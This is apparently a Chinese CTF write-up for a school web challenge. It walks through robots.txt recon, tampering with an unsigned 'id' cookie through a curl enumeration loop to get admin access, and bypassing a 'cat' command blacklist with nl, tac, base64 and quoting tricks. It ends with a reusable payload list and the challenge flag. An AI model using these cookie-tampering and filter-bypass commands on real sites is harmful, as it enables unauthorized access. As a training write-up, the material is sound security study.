# [校赛] 漏洞百出的小网站（Web · 首道 WEB）

- **平台**：校赛 ctf.npusec.org.cn:10275（网络空间安全文化节门户）
- **题目链接**：http://ctf.npusec.org.cn:10275/
- **难度**：入门
- **方向**：Web（信息泄露 + 越权 + 命令过滤绕过 + 源码泄露）
- **完成日期**：2026-09-24
- **耗时**：约 40 分钟
- **题名/分值**：官方题名「漏洞百出的小网站」· 分值待补（「内部调试终端」是 `/admin_page` 调试终端页的叫法，非题名）

## 题目描述

> 校园网络安全文化节官方门户（gunicorn/Flask），导航含登录/注册，首页有"趣味密码竞赛"板块（需登录）。

## 解题过程

### 1. 信息收集

主页 HTML 注释留了 TODO（指引看 robots.txt）：

```html
<!--
  TODO: 站点内检索 / 页面索引功能尚未完成，
  请参考 /robots.txt 进行索引策略优化后再恢复此功能。
-->
```

```text
GET /robots.txt →
User-agent: *
Disallow: /admin_page
```

直接访问 `/admin_page` → **403**：「您当前不是管理员账号，无法访问此页面」。

响应头 `Server: gunicorn` → Python Flask 系，不是 PHP。

### 2. 登录侦察

- `/register` 表单：`username`（前端 pattern `[A-Za-z0-9_]{3,20}`）+ `password`（minlength 6）
- 用 `admin / admin1` 登录成功 → `302 /dashboard`
- **关键回显**：

```http
Set-Cookie: id=0; Path=/
```

身份凭证就是一个**裸的 `id` 数字，无签名无加密**（对比：Flask 正经 session cookie 是 `eyJ...` 的签名串）→ 命门暴露。

### 3. 关键突破：改 cookie 越权

`id=0`（admin 本尊）访问 `/admin_page` 仍 403 → 说明站里还有更高权限的账号。cookie 没签名 → 直接篡改值枚举：

```bash
for i in 0 1 2 3 4 5; do
  echo -n "id=$i => "
  curl -s -o /dev/null -w "%{http_code}" http://ctf.npusec.org.cn:10275/admin_page -b "id=$i"
  echo
done
# id=0 => 403 / id=1 => 200 / id=2~5 => 403
```

**`id=1` = 建站者本尊，200 进门**。

浏览器复刻（F12 三步）：登录 → F12 → Application → Cookies → 把 `id` 值改成 `1` → 刷新 `/admin_page`。

### 4. 内部调试终端：绕过 cat

`/admin_page` 是个「内部调试终端」（假 shell，带输入表单）：

```text
$ ls -l
drwxr-xr-x src  static  template        ← 站点根目录

$ ls -l src
-rwxr-xr-x app.py (7999B)  config.py (1117B)  data/

$ cat ...
→ cat 被禁用
```

**卡点 1（路径）**：提示符只有 `$` 不显示路径，命令一律从站点根目录出发——`nl config.py`、`ls data` 全报 No such file。必须带前缀：`nl src/config.py`。

**卡点 2（cat 被禁）**：黑名单只禁了一个程序，读文件的替补一整个班：`nl` / `tac` / `head` / `more` / `grep .` / `awk` / `base64`。`nl` 一发入魂：

```text
$ nl src/config.py
 1  """WLAQ-WHSJ 配置文件 ..."""
 5  # flag 实际写到服务器根目录下，文件名故意写成 flaaag.txt（三个 a）
10  FLAG_FILE_PATH = '/flaaag.txt'
15  BLOCKED_COMMANDS = ['cat']            # 单词边界匹配，大小写不敏感
20  ADMIN_INITIAL_PASSWORD = 'NOtTheP4ssw0rd!'   # id=1 初始密码（正解是改 cookie，不是爆破）
```

源码全招了：flag 文件在 `/flaaag.txt`（三个 a，防的就是 `flag*` 通配瞎蒙）。

### 5. 获取 Flag

```text
$ nl /flaaag.txt
flag{82ec20b5-0f23-4018-91d6-6ec6a3805385}
```

> ⚠️ 陷阱注记：`config.py` 里还有一行 `FLAG = 'flag{We1c0m2_7o_w2b_w0r1d}'`——那是**源码默认值**，真 flag 是部署时写进 `/flaaag.txt` 的 UUID 版。提交 UUID 这个。

## 用到的知识点

- robots.txt 信息泄露（Disallow 就是"此地无银"清单）
- 越权：**无签名 cookie 篡改**（水平枚举→垂直提升；F12 改 cookie 是零门槛操作）
- 命令黑名单绕过：同功能替补命令（cat→nl/tac/head/grep/awk/base64）
- 源码泄露利用：优先啃小配置文件（1KB 的 config.py 比 8KB 的 app.py 信息密度高）

## 卡点与反思

- 假终端提示符不显示 cwd → 相对路径全崩。教训：**进假 shell 先 `ls` 摸清出发点，命令带全路径**
- cat 被禁后替补梯队实战分三档：**同功能程序**（tac/head/more/nl）→ **跨兵种**（grep/awk/base64）→ **字符串变形**（`ca''t`/`ca\t`）——`nl` 一发入魂，变形梯队根本没出场。教训：黑名单绕过先想"同功能别的程序"，再想"变形同程序"

## 可复用的 Payload / 命令

```bash
# 裸 cookie 越权批量探针（curl 版）
for i in 0 1 2 3 4 5; do echo -n "id=$i => "; curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/admin_page -b "id=$i"; done

# cat 被禁读文件替补梯队
nl file   tac file   head file   more file   grep . file   awk '{print}' file   base64 file
```

## 📸 截图位（补图打勾）

| # | 内容 | 文件名 | 状态 |
|:---:|:---|:---|:---:|
| 1 | robots.txt 显示 /admin_page | 01_robots.png | ⬜ |
| 2 | 403 权限不足页 | 02_403.png | ⬜ |
| 3 | F12 改 cookie id=1 | 03_cookie.png | ⬜ |
| 4 | nl src/config.py 源码输出（已有 QQ 截图） | 04_config.png | ⬜ |
| 5 | nl /flaaag.txt 出 flag | 05_flag.png | ⬜ |
